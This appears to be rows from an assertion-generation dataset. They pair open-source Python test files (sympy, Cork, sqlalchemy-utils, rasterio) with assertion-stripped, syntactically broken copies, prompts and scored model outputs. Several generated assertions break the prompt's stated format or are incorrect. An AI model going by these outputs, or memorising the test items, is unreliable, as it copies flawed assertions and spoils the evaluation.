96                strtype, length = (unichr, 65535) if randint(0, 1) else (chr, 255)
97            relation_type = strtype( randint(0, length) )
98            if randint(0, 1):
99                relation_type += strtype( randint(0, length) )
100            if relation_type not in ('==', 'eq', '!=', '<>', 'ne', '>=', 'ge',
101                                     '<=', 'le', '>', 'gt', '<', 'lt'):
102                break
103
104        raises(ValueError, lambda: Relational(x, 1, relation_type))
105
106
107def test_relational_bool_output():
108    # http://code.google.com/p/sympy/issues/detail?id=2832
109    raises(TypeError, lambda: bool(x > 3))
110    raises(TypeError, lambda: bool(x >= 3))
111    raises(TypeError, lambda: bool(x < 3))
112    raises(TypeError, lambda: bool(x <= 3))
113    raises(TypeError, lambda: bool(Eq(x, 3)))
114    raises(TypeError, lambda: bool(Ne(x, 3)))
115
116
117def test_relational_logic_symbols():
118    # See issue 3105
119
120",4222,"[[12, 'x', '!=', None, ""x must be defined before use in test_rel_ne""],
 [12, 'y', '!=', None, ""y must be defined before use in test_rel_ne""],
 [15, 'x', '!=', None, ""x must be defined before use in test_rel_subs""],
 [15, 'y', '!=', None, ""y must be defined before use in test_rel_subs""],
 [39, 'x', '!=', None, ""x must be defined before use in test_wrappers""],
 [39, 'y', '!=', None, ""y must be defined before use in test_wrappers""],
 [63, 'a', '!=', None, ""a must be defined before use in test_bool""],
 [63, 'b', '!=', None, ""b must be defined before use in test_bool""],
 [71, 'p', '!=', None, ""p must be defined before use in test_doit""],
 [71, 'n', '!=', None, ""n must be defined before use in test_doit""],
 [71, 'np', '!=', None, ""np must be defined before use in test_doit""],
 [71, 'nn', '!=', None, ""nn must be defined before use in test_doit""],
 [89, 'x', '!=', None, ""x must be defined before use in test_new_relational""],
 [108, 'x', '!=', None, ""x must be defined before use in test_relational_bool_output""]]"
FedericoCeratto/bottle-cork,"# Cork - Authentication module for the Bottle web framework
# Copyright (C) 2013 Federico Ceratto and others, see AUTHORS file.
# Released under LGPLv3+ license, see LICENSE.txt
#
# Functional test for decorators-based webapp using Json backend
#
# Requires WebTest http://webtest.pythonpaste.org/
#
# Run as: nosetests tests/test_functional_decorated.py
#

from nose import SkipTest
from webtest import TestApp
import shutil
import os

import testutils
from cork import Cork

REDIR = 302


class Test(testutils.WebFunctional):
    def create_app_instance(self):
        """"""create TestApp instance""""""
        assert self._app is None
        import simple_webapp_decorated

        self._bottle_app = simple_webapp_decorated.app
        env = {""REMOTE_ADDR"": ""127.0.0.1""}
        self._app = TestApp(self._bottle_app, extra_environ=env)
        print(""Test App created"")

    def login_as_admin(self):
        """"""perform log in""""""
        assert self._app is not None
        assert ""beaker.session.id"" not in self._app.cookies, ""Unexpected cookie found""

        self.assert_200(""/login"", ""Please insert your credentials"")
        assert ""beaker.session.id"" not in self._app.cookies, ""Unexpected cookie found""

        self.assert_redirect(""/admin"", ""/sorry_page"")

        self.assert_200(""/user_is_anonymous"", ""True"")
        assert ""beaker.session.id"" not in self._app.cookies, ""Unexpected cookie found""

        post = {""username"": ""admin"", ""password"": ""admin""}
        self.assert_redirect(""/login"", ""/"", post=post)
        assert ""beaker.session.id"" in self._app.cookies, ""Cookie not found""

        self.assert_200(""/my_role"", ""admin"")
        assert ""beaker.session.id"" in self._app.cookies, ""Cookie not found""

        import bottle

        session = bottle.request.environ.get(""beaker.session"")
        print(""Session from func. test"", repr(session))

        self.assert_200(""/login"", ""Please insert your credentials"")

        p = self._app.get(""/admin"")
        assert ""Welcome"" in p.body, repr(p)

        p = self._app.get(""/my_role"", status=200)
        assert p.status_int == 200
        assert p.body == ""admin"", ""Sta""

        print(""Login performed"")

    def test_functional_expiration(self):
        self.login_as_admin()
        r = self._app.get(""/admin"")
        assert r.status == ""200 OK"", repr(r)
        # change the cookie expiration in order to expire it
        self._app.app.options[""timeout""] = 0
        assert (
            self._app.get(""/admin"").status_int == REDIR
        ), ""The cookie should have expired""
","
1# Cork - Authentication module for the Bottle web framework
2# Copyright (C) 2013 Federico Ceratto and others, see AUTHORS file.
3# Released under LGPLv3+ license, see LICENSE.txt
4#
5# Functional test for decorators-based webapp using Json backend
6#
7# Requires WebTest http://webtest.pythonpaste.org/
8#
9# Run as: nosetests tests/test_functional_decorated.py
10#
11
12from nose import SkipTest
13from webtest import TestApp
14import shutil
15import os
16
17import testutils
18from cork import Cork
19
20REDIR = 302
21
22
23class Test(testutils.WebFunctional):
24    def create_app_instance(self):
25        """"""create TestApp instance""""""
26        import simple_webapp_decorated
27
28        self._bottle_app = simple_webapp_decorated.app
29        env = {""REMOTE_ADDR"": ""127.0.0.1""}
30        self._app = TestApp(self._bottle_app, extra_environ=env)
31        print(""Test App created"")
32
33    def login_as_admin(self):
34        """"""perform log in""""""
35
36
37
38
39        post = {""username"": ""admin"", ""password"": ""admin""}
40
41
42        import bottle
43
44        session = bottle.request.environ.get(""beaker.session"")
45        print(""Session from func. test"", repr(session))
46
47
48        p = self._app.get(""/admin"")
49
50        p = self._app.get(""/my_role"", status=200)
51
52        print(""Login performed"")
53
54    def test_functional_expiration(self):
55        self.login_as_admin()
56        r = self._app.get(""/admin"")
57        # change the cookie expiration in order to expire it
58        self._app.app.options[""timeout""] = 0
59            self._app.get(""/admin"").status_int == REDIR
60        ), ""The cookie should have expired""
61","[['self._app', '==', 'None'], ['self._app', '==', 'not None'], ['p.status_int', '==', '200'], ['p.body', '==', '""admin""'], ['r.status', '==', '""200 OK""'], ['(', '==', 'True']]",18,6,0.3333333333333333,0.0023529411764705,"['REDIR', 'self._bottle_app', 'env', 'self._app', 'post', 'session', 'p', 'r', 'self._app.app.options[""timeout""]']",9,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['REDIR', 'self._bottle_app', 'env', 'self._app', 'post', 'session', 'p', 'r', 'self._app.app.options[""timeout""]']
*Code:

1# Cork - Authentication module for the Bottle web framework
2# Copyright (C) 2013 Federico Ceratto and others, see AUTHORS file.
3# Released under LGPLv3+ license, see LICENSE.txt
4#
5# Functional test for decorators-based webapp using Json backend
6#
7# Requires WebTest http://webtest.pythonpaste.org/
8#
9# Run as: nosetests tests/test_functional_decorated.py
10#
11
12from nose import SkipTest
13from webtest import TestApp
14import shutil
15import os
16
17import testutils
18from cork import Cork
19
20REDIR = 302
21
22
23class Test(testutils.WebFunctional):
24    def create_app_instance(self):
25        """"""create TestApp instance""""""
26        import simple_webapp_decorated
27
28        self._bottle_app = simple_webapp_decorated.app
29        env = {""REMOTE_ADDR"": ""127.0.0.1""}
30        self._app = TestApp(self._bottle_app, extra_environ=env)
31        print(""Test App created"")
32
33    def login_as_admin(self):
34        """"""perform log in""""""
35
36
37
38
39        post = {""username"": ""admin"", ""password"": ""admin""}
40
41
42        import bottle
43
44        session = bottle.request.environ.get(""beaker.session"")
45        print(""Session from func. test"", repr(session))
46
47
48        p = self._app.get(""/admin"")
49
50        p = self._app.get(""/my_role"", status=200)
51
52        print(""Login performed"")
53
54    def test_functional_expiration(self):
55        self.login_as_admin()
56        r = self._app.get(""/admin"")
57        # change the cookie expiration in order to expire it
58        self._app.app.options[""timeout""] = 0
59            self._app.get(""/admin"").status_int == REDIR
60        ), ""The cookie should have expired""
61",3150,"[[24, 'self._bottle_app', '!=', None, ""app instance should be created""],
[30, 'env', '==', {""REMOTE_ADDR"": ""127.0.0.1""}, ""Required environment variables should be set""],
[30, 'self._app', '!=', None, ""TestApp instance should be created""],
[39, 'post', '==', {""username"": ""admin"", ""password"": ""admin""}, ""Post request should contain correct credentials""],
[48, 'p', '!=', None, ""Admin page response should not be null""],
[50, 'p', '!=', None, ""My_role page response should not be null""],
[56, 'r', '!=', None, ""Admin page response should not be null""],
[58, 'self._app.app.options[""timeout""]', '==', 0, ""Cookie timeout should be set to zero""]]"
marrybird/sqlalchemy-utils,"import six
import sqlalchemy as sa
from pytest import mark
from sqlalchemy.util.langhelpers import symbol

from sqlalchemy_utils.path import AttrPath, Path
from tests import TestCase


class TestAttrPath(TestCase):
    def create_models(self):
        class Document(self.Base):
            __tablename__ = 'document'
            id = sa.Column(sa.Integer, primary_key=True)
            name = sa.Column(sa.Unicode(255))
            locale = sa.Column(sa.String(10))

        class Section(self.Base):
            __tablename__ = 'section'
            id = sa.Column(sa.Integer, primary_key=True)
            name = sa.Column(sa.Unicode(255))
            locale = sa.Column(sa.String(10))

            document_id = sa.Column(
                sa.Integer, sa.ForeignKey(Document.id)
            )

            document = sa.orm.relationship(Document, backref='sections')

        class SubSection(self.Base):
            __tablename__ = 'subsection'
            id = sa.Column(sa.Integer, primary_key=True)
            name = sa.Column(sa.Unicode(255))
            locale = sa.Column(sa.String(10))

            section_id = sa.Column(
                sa.Integer, sa.ForeignKey(Section.id)
            )

            section = sa.orm.relationship(Section, backref='subsections')

        self.Document = Document
        self.Section = Section
        self.SubSection = SubSection

    @mark.parametrize(
        ('class_', 'path', 'direction'),
        (
            ('SubSection', 'section', symbol('MANYTOONE')),
        )
    )
    def test_direction(self, class_, path, direction):
        assert (
            AttrPath(getattr(self, class_), path).direction == direction
        )

    def test_invert(self):
        path = ~ AttrPath(self.SubSection, 'section.document')
        assert path.parts == [
            self.Document.sections,
            self.Section.subsections
        ]
        assert str(path.path) == 'sections.subsections'

    def test_len(self):
        len(AttrPath(self.SubSection, 'section.document')) == 2

    def test_init(self):
        path = AttrPath(self.SubSection, 'section.document')
        assert path.class_ == self.SubSection
        assert path.path == Path('section.document')

    def test_iter(self):
        path = AttrPath(self.SubSection, 'section.document')
        assert list(path) == [
            self.SubSection.section,
            self.Section.document
        ]

    def test_repr(self):
        path = AttrPath(self.SubSection, 'section.document')
        assert repr(path) == (
            ""AttrPath(SubSection, 'section.document')""
        )

    def test_index(self):
        path = AttrPath(self.SubSection, 'section.document')
        assert path.index(self.Section.document) == 1
        assert path.index(self.SubSection.section) == 0

    def test_getitem(self):
        path = AttrPath(self.SubSection, 'section.document')
        assert path[0] is self.SubSection.section
        assert path[1] is self.Section.document

    def test_getitem_with_slice(self):
        path = AttrPath(self.SubSection, 'section.document')
        assert path[:] == AttrPath(self.SubSection, 'section.document')
        assert path[:-1] == AttrPath(self.SubSection, 'section')
        assert path[1:] == AttrPath(self.Section, 'document')

    def test_eq(self):
        assert (
            AttrPath(self.SubSection, 'section.document') ==
            AttrPath(self.SubSection, 'section.document')
        )
        assert not (
            AttrPath(self.SubSection, 'section') ==
            AttrPath(self.SubSection, 'section.document')
        )

    def test_ne(self):
        assert not (
            AttrPath(self.SubSection, 'section.document') !=
            AttrPath(self.SubSection, 'section.document')
        )
        assert (
            AttrPath(self.SubSection, 'section') !=
            AttrPath(self.SubSection, 'section.document')
        )


class TestPath(object):
    def test_init(self):
        path = Path('attr.attr2')
        assert path.path == 'attr.attr2'

    def test_init_with_path_object(self):
        path = Path(Path('attr.attr2'))
        assert path.path == 'attr.attr2'

    def test_iter(self):
        path = Path('s.s2.s3')
        assert list(path) == ['s', 's2', 's3']

    @mark.parametrize(('path', 'length'), (
        (Path('s.s2.s3'), 3),
        (Path('s.s2'), 2),
        (Path(''), 0)
    ))
    def test_len(self, path, length):
        return len(path) == length

    def test_reversed(self):
        path = Path('s.s2.s3')
        assert list(reversed(path)) == ['s3', 's2', 's']

    def test_repr(self):
        path = Path('s.s2')
        assert repr(path) == ""Path('s.s2')""

    def test_getitem(self):
        path = Path('s.s2')
        assert path[0] == 's'
        assert path[1] == 's2'

    def test_str(self):
        assert str(Path('s.s2')) == 's.s2'

    def test_index(self):
        assert Path('s.s2.s3').index('s2') == 1

    def test_unicode(self):
        assert six.text_type(Path('s.s2')) == u's.s2'

    def test_getitem_with_slice(self):
        path = Path('s.s2.s3')
        assert path[1:] == Path('s2.s3')

    @mark.parametrize(('test', 'result'), (
        (Path('s.s2') == Path('s.s2'), True),
        (Path('s.s2') == Path('s.s3'), False)
    ))
    def test_eq(self, test, result):
        assert test is result

    @mark.parametrize(('test', 'result'), (
        (Path('s.s2') != Path('s.s2'), False),
        (Path('s.s2') != Path('s.s3'), True)
    ))
    def test_ne(self, test, result):
        assert test is result
","
1import six
2import sqlalchemy as sa
3from pytest import mark
4from sqlalchemy.util.langhelpers import symbol
5
6from sqlalchemy_utils.path import AttrPath, Path
7from tests import TestCase
8
9
10class TestAttrPath(TestCase):
11    def create_models(self):
12        class Document(self.Base):
13            __tablename__ = 'document'
14            id = sa.Column(sa.Integer, primary_key=True)
15            name = sa.Column(sa.Unicode(255))
16            locale = sa.Column(sa.String(10))
17
18        class Section(self.Base):
19            __tablename__ = 'section'
20            id = sa.Column(sa.Integer, primary_key=True)
21            name = sa.Column(sa.Unicode(255))
22            locale = sa.Column(sa.String(10))
23
24            document_id = sa.Column(
25                sa.Integer, sa.ForeignKey(Document.id)
26            )
27
28            document = sa.orm.relationship(Document, backref='sections')
29
30        class SubSection(self.Base):
31            __tablename__ = 'subsection'
32            id = sa.Column(sa.Integer, primary_key=True)
33            name = sa.Column(sa.Unicode(255))
34            locale = sa.Column(sa.String(10))
35
36            section_id = sa.Column(
37                sa.Integer, sa.ForeignKey(Section.id)
38            )
39
40            section = sa.orm.relationship(Section, backref='subsections')
41
42        self.Document = Document
43        self.Section = Section
44        self.SubSection = SubSection
45
46    @mark.parametrize(
47        ('class_', 'path', 'direction'),
48        (
49            ('SubSection', 'section', symbol('MANYTOONE')),
50        )
51    )
52    def test_direction(self, class_, path, direction):
53            AttrPath(getattr(self, class_), path).direction == direction
54        )
55
56    def test_invert(self):
57        path = ~ AttrPath(self.SubSection, 'section.document')
58            self.Document.sections,
59            self.Section.subsections
60        ]
61
62    def test_len(self):
63        len(AttrPath(self.SubSection, 'section.document')) == 2
64
65    def test_init(self):
66        path = AttrPath(self.SubSection, 'section.document')
67
68    def test_iter(self):
69        path = AttrPath(self.SubSection, 'section.document')
70            self.SubSection.section,
71            self.Section.document
72        ]
73
74    def test_repr(self):
75        path = AttrPath(self.SubSection, 'section.document')
76            ""AttrPath(SubSection, 'section.document')""
77        )
78
79    def test_index(self):
80        path = AttrPath(self.SubSection, 'section.document')
81
82    def test_getitem(self):
83        path = AttrPath(self.SubSection, 'section.document')
84
85    def test_getitem_with_slice(self):
86        path = AttrPath(self.SubSection, 'section.document')
87
88    def test_eq(self):
89            AttrPath(self.SubSection, 'section.document') ==
90            AttrPath(self.SubSection, 'section.document')
91        )
92            AttrPath(self.SubSection, 'section') ==
93            AttrPath(self.SubSection, 'section.document')
94        )
95
96    def test_ne(self):
97            AttrPath(self.SubSection, 'section.document') !=
98            AttrPath(self.SubSection, 'section.document')
99        )
100            AttrPath(self.SubSection, 'section') !=
101            AttrPath(self.SubSection, 'section.document')
102        )
103
104
105class TestPath(object):
106    def test_init(self):
107        path = Path('attr.attr2')
108
109    def test_init_with_path_object(self):
110        path = Path(Path('attr.attr2'))
111
112    def test_iter(self):
113        path = Path('s.s2.s3')
114
115    @mark.parametrize(('path', 'length'), (
116        (Path('s.s2.s3'), 3),
117        (Path('s.s2'), 2),
118        (Path(''), 0)
119    ))
120    def test_len(self, path, length):
121        return len(path) == length
122
123    def test_reversed(self):
124        path = Path('s.s2.s3')
125
126    def test_repr(self):
127        path = Path('s.s2')
128
129    def test_getitem(self):
130        path = Path('s.s2')
131
132    def test_str(self):
133
134    def test_index(self):
135
136    def test_unicode(self):
137
138    def test_getitem_with_slice(self):
139        path = Path('s.s2.s3')
140
141    @mark.parametrize(('test', 'result'), (
142        (Path('s.s2') == Path('s.s2'), True),
143        (Path('s.s2') == Path('s.s3'), False)
144    ))
145    def test_eq(self, test, result):
146
147    @mark.parametrize(('test', 'result'), (
148        (Path('s.s2') != Path('s.s2'), False),
149        (Path('s.s2') != Path('s.s3'), True)
150    ))
151    def test_ne(self, test, result):
152","[['(', '==', 'True'], ['path.parts', '==', '['], ['str(path.path)', '==', ""'sections.subsections'""], ['path.class_', '==', 'self.SubSection'], ['path.path', '==', ""Path('section.document')""], ['list(path)', '==', '['], ['repr(path)', '==', '('], ['path.index(self.Section.document)', '==', '1'], ['path.index(self.SubSection.section)', '==', '0'], ['path[0]', '==', 'self.SubSection.section'], ['path[1]', '==', 'self.Section.document'], ['path[:]', '==', 'AttrPath(self.SubSection'], ['path[:-1]', '==', 'AttrPath(self.SubSection'], ['path[1:]', '==', 'AttrPath(self.Section'], ['(', '==', 'True'], ['(', '==', 'False'], ['(', '==', 'False'], ['(', '==', 'True'], ['path.path', '==', ""'attr.attr2'""], ['path.path', '==', ""'attr.attr2'""], ['list(path)', '==', ""['s'""], ['list(reversed(path))', '==', ""['s3'""], ['repr(path)', '==', '""Path(\'s.s2\')""'], ['path[0]', '==', ""'s'""], ['path[1]', '==', ""'s2'""], [""str(Path('s.s2'))"", '==', ""'s.s2'""], [""Path('s.s2.s3').index('s2')"", '==', '1'], [""six.text_type(Path('s.s2'))"", '==', ""u's.s2'""], ['path[1:]', '==', ""Path('s2.s3')""], ['test', '==', 'result'], ['test', '==', 'result']]",31,31,1.0,0.0055715312724658,"['__tablename__', 'id', 'name', 'locale', 'document_id', 'document', 'section_id', 'section', 'self.Document', 'self.Section', 'self.SubSection', 'class_', 'path', 'direction', 'length', 'test', 'result']",17,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['__tablename__', 'id', 'name', 'locale', 'document_id', 'document', 'section_id', 'section', 'self.Document', 'self.Section', 'self.SubSection', 'class_', 'path', 'direction', 'length', 'test', 'result']
*Code:

1import six
2import sqlalchemy as sa
3from pytest import mark
4from sqlalchemy.util.langhelpers import symbol
5
6from sqlalchemy_utils.path import AttrPath, Path
7from tests import TestCase
8
9
10class TestAttrPath(TestCase):
11    def create_models(self):
12        class Document(self.Base):
13            __tablename__ = 'document'
14            id = sa.Column(sa.Integer, primary_key=True)
15            name = sa.Column(sa.Unicode(255))
16            locale = sa.Column(sa.String(10))
17
18        class Section(self.Base):
19            __tablename__ = 'section'
20            id = sa.Column(sa.Integer, primary_key=True)
21            name = sa.Column(sa.Unicode(255))
22            locale = sa.Column(sa.String(10))
23
24            document_id = sa.Column(
25                sa.Integer, sa.ForeignKey(Document.id)
26            )
27
28            document = sa.orm.relationship(Document, backref='sections')
29
30        class SubSection(self.Base):
31            __tablename__ = 'subsection'
32            id = sa.Column(sa.Integer, primary_key=True)
33            name = sa.Column(sa.Unicode(255))
34            locale = sa.Column(sa.String(10))
35
36            section_id = sa.Column(
37                sa.Integer, sa.ForeignKey(Section.id)
38            )
39
40            section = sa.orm.relationship(Section, backref='subsections')
41
42        self.Document = Document
43        self.Section = Section
44        self.SubSection = SubSection
45
46    @mark.parametrize(
47        ('class_', 'path', 'direction'),
48        (
49            ('SubSection', 'section', symbol('MANYTOONE')),
50        )
51    )
52    def test_direction(self, class_, path, direction):
53            AttrPath(getattr(self, class_), path).direction == direction
54        )
55
56    def test_invert(self):
57        path = ~ AttrPath(self.SubSection, 'section.document')
58            self.Document.sections,
59            self.Section.subsections
60        ]
61
62    def test_len(self):
63        len(AttrPath(self.SubSection, 'section.document')) == 2
64
65    def test_init(self):
66        path = AttrPath(self.SubSection, 'section.document')
67
68    def test_iter(self):
69        path = AttrPath(self.SubSection, 'section.document')
70            self.SubSection.section,
71            self.Section.document
72        ]
73
74    def test_repr(self):
75        path = AttrPath(self.SubSection, 'section.document')
76            ""AttrPath(SubSection, 'section.document')""
77        )
78
79    def test_index(self):
80        path = AttrPath(self.SubSection, 'section.document')
81
82    def test_getitem(self):
83        path = AttrPath(self.SubSection, 'section.document')
84
85    def test_getitem_with_slice(self):
86        path = AttrPath(self.SubSection, 'section.document')
87
88    def test_eq(self):
89            AttrPath(self.SubSection, 'section.document') ==
90            AttrPath(self.SubSection, 'section.document')
91        )
92            AttrPath(self.SubSection, 'section') ==
93            AttrPath(self.SubSection, 'section.document')
94        )
95
96    def test_ne(self):
97            AttrPath(self.SubSection, 'section.document') !=
98            AttrPath(self.SubSection, 'section.document')
99        )
100            AttrPath(self.SubSection, 'section') !=
101            AttrPath(self.SubSection, 'section.document')
102        )
103
104
105class TestPath(object):
106    def test_init(self):
107        path = Path('attr.attr2')
108
109    def test_init_with_path_object(self):
110        path = Path(Path('attr.attr2'))
111
112    def test_iter(self):
113        path = Path('s.s2.s3')
114
115    @mark.parametrize(('path', 'length'), (
116        (Path('s.s2.s3'), 3),
117        (Path('s.s2'), 2),
118        (Path(''), 0)
119    ))
120    def test_len(self, path, length):
121        return len(path) == length
122
123    def test_reversed(self):
124        path = Path('s.s2.s3')
125
126    def test_repr(self):
127        path = Path('s.s2')
128
129    def test_getitem(self):
130        path = Path('s.s2')
131
132    def test_str(self):
133
134    def test_index(self):
135
136    def test_unicode(self):
137
138    def test_getitem_with_slice(self):
139        path = Path('s.s2.s3')
140
141    @mark.parametrize(('test', 'result'), (
142        (Path('s.s2') == Path('s.s2'), True),
143        (Path('s.s2') == Path('s.s3'), False)
144    ))
145    def test_eq(self, test, result):
146
147    @mark.parametrize(('test', 'result'), (
148        (Path('s.s2') != Path('s.s2'), False),
149        (Path('s.s2') != Path('s.s3'), True)
150    ))
151    def test_ne(self, test, result):
152",6212,"[[13, '__tablename__', '==', 'document', 'table name must be assigned correctly for document class'],
[19, '__tablename__', '==', 'section', 'table name must be assigned correctly for section class'],
[31, '__tablename__', '==', 'subsection', 'table name must be assigned correctly for subsection class'],
[66, 'path', '==', 'section.document', 'path needs to match the provided value in test_init method of TestAttrPath'],
[120, 'length', '==', 3, ""Length of the 'path' in test_len method""], 
[127, 'path', '==', 's.s2', ""Path provided must be 's.s2'""], 
[139, 'path', '==', 's.s2.s3', ""Path provided must be 's.s3'""],
[145, 'result', '==', True, 'The assertion test in test_eq method must return true'],
[151, 'result', '==', True, 'The assertion test in test_ne method must return true']]"
clembou/rasterio,"import logging
import sys

import numpy as np
from pytest import fixture

import rasterio


logging.basicConfig(stream=sys.stderr, level=logging.DEBUG)


def test_masks():
    with rasterio.open('tests/data/RGB.byte.tif') as src:
        rm, gm, bm = src.read_masks()
        r, g, b = src.read(masked=False)
        assert not r[rm==0].any()
        assert not g[gm==0].any()
        assert not b[bm==0].any()


def test_masked_true():
    with rasterio.open('tests/data/RGB.byte.tif') as src:
        r, g, b = src.read(masked=True)
        rm, gm, bm = src.read_masks()
        assert (r.mask==~rm.astype('bool')).all()
        assert (g.mask==~gm.astype('bool')).all()
        assert (b.mask==~bm.astype('bool')).all()


def test_masked_none():
    with rasterio.open('tests/data/RGB.byte.tif') as src:
        r, g, b = src.read(masked=True)
        rm, gm, bm = src.read_masks()
        assert (r.mask==~rm.astype('bool')).all()
        assert (g.mask==~gm.astype('bool')).all()
        assert (b.mask==~bm.astype('bool')).all()


@fixture(scope='function')
def tiffs(tmpdir):
    with rasterio.open('tests/data/RGB.byte.tif') as src:
        kwds = src.meta
        
        del kwds['nodata']
        with rasterio.open(
                str(tmpdir.join('no-nodata.tif')), 'w',
                **kwds) as dst:
            dst.write(src.read(masked=False))

        with rasterio.open(
                str(tmpdir.join('sidecar-masked.tif')), 'w',
                **kwds) as dst:
            dst.write(src.read(masked=False))
            mask = np.zeros(src.shape, dtype='uint8')
            dst.write_mask(mask)

    return tmpdir


def test_masking_no_nodata(tiffs):
    # if the dataset has no defined nodata values, all data is
    # considered valid data. The GDAL masks bands are arrays of
    # 255 values. ``read()`` returns masked arrays where `mask`
    # is False.
    filename = str(tiffs.join('no-nodata.tif'))
    with rasterio.open(filename) as src:

        rgb = src.read(masked=False)
        assert not hasattr(rgb, 'mask')
        r = src.read(1, masked=False)
        assert not hasattr(r, 'mask')

        rgb = src.read(masked=True)
        assert hasattr(rgb, 'mask')
        assert not rgb.mask.any()
        r = src.read(1, masked=True)
        assert hasattr(r, 'mask')
        assert not r.mask.any()

        rgb = src.read(masked=True)
        assert hasattr(rgb, 'mask')
        assert not r.mask.any()
        r = src.read(1, masked=True)
        assert not r.mask.any()

        masks = src.read_masks()
        assert masks.all()


def test_masking_sidecar_mask(tiffs):
    # If the dataset has a .msk sidecar mask band file, all masks will
    # be derived from that file.
    with rasterio.open(str(tiffs.join('sidecar-masked.tif'))) as src:
        rgb = src.read(masked=True)
        assert rgb.mask.all()
        r = src.read(1, masked=True)
        assert r.mask.all()
        masks = src.read_masks()
        assert not masks.any()
","
1import logging
2import sys
3
4import numpy as np
5from pytest import fixture
6
7import rasterio
8
9
10logging.basicConfig(stream=sys.stderr, level=logging.DEBUG)
11
12
13def test_masks():
14    with rasterio.open('tests/data/RGB.byte.tif') as src:
15        rm, gm, bm = src.read_masks()
16        r, g, b = src.read(masked=False)
17
18
19def test_masked_true():
20    with rasterio.open('tests/data/RGB.byte.tif') as src:
21        r, g, b = src.read(masked=True)
22        rm, gm, bm = src.read_masks()
23
24
25def test_masked_none():
26    with rasterio.open('tests/data/RGB.byte.tif') as src:
27        r, g, b = src.read(masked=True)
28        rm, gm, bm = src.read_masks()
29
30
31@fixture(scope='function')
32def tiffs(tmpdir):
33    with rasterio.open('tests/data/RGB.byte.tif') as src:
34        kwds = src.meta
35        
36        del kwds['nodata']
37        with rasterio.open(
38                str(tmpdir.join('no-nodata.tif')), 'w',
39                **kwds) as dst:
40            dst.write(src.read(masked=False))
41
42        with rasterio.open(
43                str(tmpdir.join('sidecar-masked.tif')), 'w',
44                **kwds) as dst:
45            dst.write(src.read(masked=False))
46            mask = np.zeros(src.shape, dtype='uint8')
47            dst.write_mask(mask)
48
49    return tmpdir
50
51
52def test_masking_no_nodata(tiffs):
53    # if the dataset has no defined nodata values, all data is
54    # considered valid data. The GDAL masks bands are arrays of
55    # 255 values. ``read()`` returns masked arrays where `mask`
56    # is False.
57    filename = str(tiffs.join('no-nodata.tif'))
58    with rasterio.open(filename) as src:
59
60        rgb = src.read(masked=False)
61        r = src.read(1, masked=False)
62
63        rgb = src.read(masked=True)
64        r = src.read(1, masked=True)
65
66        rgb = src.read(masked=True)
67        r = src.read(1, masked=True)
68
69        masks = src.read_masks()
70
71
72def test_masking_sidecar_mask(tiffs):
73    # If the dataset has a .msk sidecar mask band file, all masks will
74    # be derived from that file.
75    with rasterio.open(str(tiffs.join('sidecar-masked.tif'))) as src:
76        rgb = src.read(masked=True)
77        r = src.read(1, masked=True)
78        masks = src.read_masks()
79","[['r[rm==0].any()', '==', 'False'], ['g[gm==0].any()', '==', 'False'], ['b[bm==0].any()', '==', 'False'], [""(r.mask==~rm.astype('bool')).all()"", '==', 'True'], [""(g.mask==~gm.astype('bool')).all()"", '==', 'True'], [""(b.mask==~bm.astype('bool')).all()"", '==', 'True'], [""(r.mask==~rm.astype('bool')).all()"", '==', 'True'], [""(g.mask==~gm.astype('bool')).all()"", '==', 'True'], [""(b.mask==~bm.astype('bool')).all()"", '==', 'True'], ['hasattr(rgb', '==', 'False'], ['hasattr(r', '==', 'False'], ['hasattr(rgb', '==', 'True'], ['rgb.mask.any()', '==', 'False'], ['hasattr(r', '==', 'True'], ['r.mask.any()', '==', 'False'], ['hasattr(rgb', '==', 'True'], ['r.mask.any()', '==', 'False'], ['r.mask.any()', '==', 'False'], ['masks.all()', '==', 'True'], ['rgb.mask.all()', '==', 'True'], ['r.mask.all()', '==', 'True'], ['masks.any()', '==', 'False']]",22,22,1.0,0.0073875083948959,"['rm', 'gm', 'bm', 'r', 'g', 'b', 'tmpdir', 'kwds', 'mask', 'tiffs', 'filename', 'rgb', 'masks']",13,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
